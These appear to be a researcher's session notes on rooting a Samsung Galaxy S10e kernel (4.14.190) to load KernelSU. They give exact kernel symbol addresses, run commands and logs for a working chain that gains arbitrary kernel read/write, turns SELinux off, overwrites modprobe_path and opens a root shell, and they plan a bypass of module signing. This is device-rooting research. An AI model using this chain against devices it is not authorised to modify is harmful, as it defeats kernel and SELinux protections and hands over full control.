# KSU / root findings (session notes — beyond0q, SM-G970W, 4.14.190)

Target: `4.14.190-23725627-abG970WVLU9IXE1` (Android 12, non-GKI, locked bootloader).
Kernel ELF + full symbol table available: `~/ghostlock/kernel/vmlinux.elf`,
`~/ghostlock/kernel/kallsyms_fixed.txt`.

## 1. Exploit primitives — status
| Stage | Result |
|---|---|
| PI walk + fops redirect (mode 4) | ✅ works, reproducibly (log: `ssopt post paint walked=1`, `cfi fops_before == fake_fops`) |
| configfs arbitrary R/W (`physrw: configfs-only`) | ✅ (read+write arbitrary kernel addr via `configfs_write_once`) |
| SELinux off (write `selinux_enforcing=0`) | ✅ |
| UMH root (`--stop-after=umh`) | ✅ **runs** `dnroot` as root (`retval=0`) **iff the payload was "warmed"** (exec once from shell → fscrypt `i_crypt_info` cached, else `-ENOKEY`) |
| cred path (`--stop-after=cred`) | ❌ wedges → reboot |
| KernelSU late-load (LKM) | ⛔ blocked by `CONFIG_MODULE_SIG_FORCE=y` |

### UMH caveat (kernel-spawned task I/O)
The UMH child runs as **uid 0** but its **writes produce no data**: `/data` files are
created but **0 bytes**; socket writes from its daemon never reached the client.
A daemon in a *normal* process works (verified: `[daemon] accepted … uid=2000 … sh -i`),
so it is the UMH-spawned environment that is write-crippled (blocked on *content*
writes; a modprobe-spawned task, see §3, DID print a root prompt to a socket).

## 2. Key kernel symbols (image base `KIMAGE_TEXT_BASE = 0xffffff8008000000`)
`kallsyms_fixed.txt` (exact, device-matched):
```
modprobe_path  0xffffff800a9b93c0   core_pattern 0xffffff800a9e6120
commit_creds   0xffffff800805e6d4   prepare_kernel_cred 0xffffff800805ee5c
init_cred      0xffffff800a20e0d0   init_task 0xffffff800a9a9780
sys_call_table 0xffffff8009781000   set_memory_rw 0xffffff800802661c
selinux_enforcing 0xffffff800adc8ce8 (off 0x2DC8CE8 → repo target.h)  ✓
modules_disabled 0xffffff800ad349c8
__arm64_sys_*   load_module 0xffffff80080fc804   mod_verify_sig 0xffffff80080fcc6c
```
`sig_enforce` is **NOT** a named symbol and `/sys/module/kernel/parameters/sig_enforce`
does **not exist** on this build.

## 3. modprobe_path → ROOT (WORKS)
PoC wired into `src/core/fops.c` (env `MP_PATH`): right after the redirect verify it
writes `MP_PATH` into `modprobe_path` (via `data_addr`, verified by read-back) **and
writes 0 to `selinux_enforcing`**. Trigger = exec a file with an unknown binary magic
(`\xff\xff\xff\xff`) → kernel `request_module("binfmt-ffff")` → `call_modprobe()` runs
`modprobe_path` **as root** (`call_usermodehelper`, real path).

**Critical requirement:** SELinux must be **permissive first** — while enforcing, the
LNK `security_kernel_module_request` hook blocks `request_module`, so no helper runs.
```
[run] modprobe_path @... <- '/data/local/tmp/mphelper' wr=25 rd=63 rb='...' selinux_off=1
[trigger] /data/local/tmp/pwn2
[check]  15032 root  mphelper -q -- binfmt-ffff
         tcp 0 0 127.0.0.1:2223 LISTEN
[connect] sh: can't find tty fd …  :/ #     <-- root shell prompt (uid 0)
```
Helpers: `tools/mphelper.c` (root daemon, `rootshell.c`) + `pwn2` (4×0xFF trigger).
Run: `env … FORCE_REDIRECT=1 SLIDE=0x… MP_PATH=/data/local/tmp/mphelper \
      ./glA17 --stop-after=verify --log=info`  then exec `pwn2`.

### Open items
- Daemon command I/O flaky on the socket in the modprobe env (prompt ok, `id` output
  not seen) — `mphelper` now does read-one-line + `sh -c` (built, not re-tested).
- `/data` **content** writes still fail from kernel-spawned tasks (fscrypt key), only
  metadata/creation works; sockets are fine.

## 4. Building KernelSU (from ROM source `~/ghostlock/src/g9700`)
- Build with **gcc** (override the Samsung clang wrapper):
  `make -C $S O=$S/out ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- \
        CC=aarch64-linux-gnu-gcc LD=aarch64-linux-gnu-ld modules_prepare`
  (`python2` present; `.cmd` files show the author also used `aarch64-linux-gnu-gcc`).
- `hello.ko` builds and its **vermagic matches** the device
  (`4.14.190 SMP preempt mod_unload modversions aarch64`).
- **No `Module.symvers` needed**: `kernel/module.c:check_version` tolerates an empty
  `__versions` section (warn-once → return 1).
- `CONFIG_MODVERSIONS=y`, **`CONFIG_MODULE_SIG_FORCE=y` + `MODULE_SIG_ALL=y`** →
  unsigned `hello.ko` **did not load** (UMH root ran `insmod` → `/proc/modules` empty).
- Full kernel build with gcc 14 **fails** (4.14 vs gcc 14) → no `System.map`.
- ⇒ To load KernelSU: patch the sig check — either the `sig_enforce` byte (address TBD;
  not in kallsyms) or the `module_sig_check`/`mod_verify_sig` **code** (needs
  `set_memory_rw` → needs a kernel call primitive; `CONFIG_STRICT_KERNEL_RWX=y`).
- Vendored sources in `refs/kernelsu/` (BakaSU `kernel/` + `userspace/` + ROM configs).
  Full kernel source copied to `refs/rom-4.14-full/` (**gitignored**; NTFS case-collision
  makes a full copy lossy).

## 5. Repo changes this session
- `main.c` `write_root_script()`: KMI fallback `AVER="android$(getprop ro.build.version.release)"`
  (Samsung `uname -r` has no `androidNN`, old code produced `KMI=-4.14`).
- `target.h`: `MODPROBE_PATH_OFF 0x029B93C0`.
- `fops.c`: `MP_PATH` hook (write `modprobe_path` + SELinux off) after redirect verify.
- `primitives/rootshell.c`: daemon handler (diagnostics + read-one-line/`sh -c`).
- `tools/mphelper.c`, `tools/_build_mphelper.sh`.
